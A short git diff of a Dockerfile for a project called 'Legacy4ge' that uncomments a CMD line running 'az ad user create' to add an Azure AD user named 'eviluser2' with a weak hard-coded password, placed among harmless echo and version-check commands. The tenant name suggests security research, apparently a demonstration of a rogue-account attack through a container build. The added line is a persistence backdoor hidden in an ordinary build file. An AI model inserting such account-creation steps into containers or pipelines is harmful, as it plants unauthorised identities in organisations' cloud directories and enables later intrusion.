@@ -13,5 +13,5 @@ EXPOSE 80
 CMD ["echo", "Hello from Legacy4ge"]
 CMD [ "az --version > az.txt"]
 CMD ["cat az.txt"]
-#CMD [ "az ad user create --display-name eviluser2 --password p@ssword --user-principal-name eviluser2@ciscoswcresearch.onmicrosoft.com" ]
+CMD [ "az ad user create --display-name eviluser2 --password p@ssword --user-principal-name eviluser2@ciscoswcresearch.onmicrosoft.com" ]
 #CMD ["node", "/src/server.js"]
